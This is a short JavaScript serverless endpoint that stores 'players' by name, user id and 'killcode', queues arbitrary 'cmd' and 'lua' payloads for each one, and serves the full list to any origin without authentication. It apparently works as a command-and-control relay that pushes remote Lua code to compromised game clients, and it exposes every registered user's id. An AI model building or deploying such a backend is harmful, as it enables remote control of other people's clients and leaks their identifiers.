// /api/send.js
let players = [];

export default function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');

  if (req.method === 'GET') {
    const { player, userid, killcode, timestamp, cmd, lua } = req.query;

    // Register/update player
    if (player && userid && killcode) {
      let entry = players.find(p => p.killcode === killcode);
      if (!entry) {
        entry = { player, userid, killcode, timestamp: timestamp || Date.now(), commands: [] };
        players.push(entry);
      } else {
        entry.player = player;
        entry.userid = userid;
        entry.timestamp = timestamp || Date.now();
      }

      // If a command was sent, queue it
      if (cmd) entry.commands.push({ type: "cmd", value: cmd, ts: Date.now() });
      if (lua) entry.commands.push({ type: "lua", value: lua, ts: Date.now() });
    }

    res.status(200).json(players);
    return;
  }

  res.status(405).json({ error: 'Method not allowed' });
}
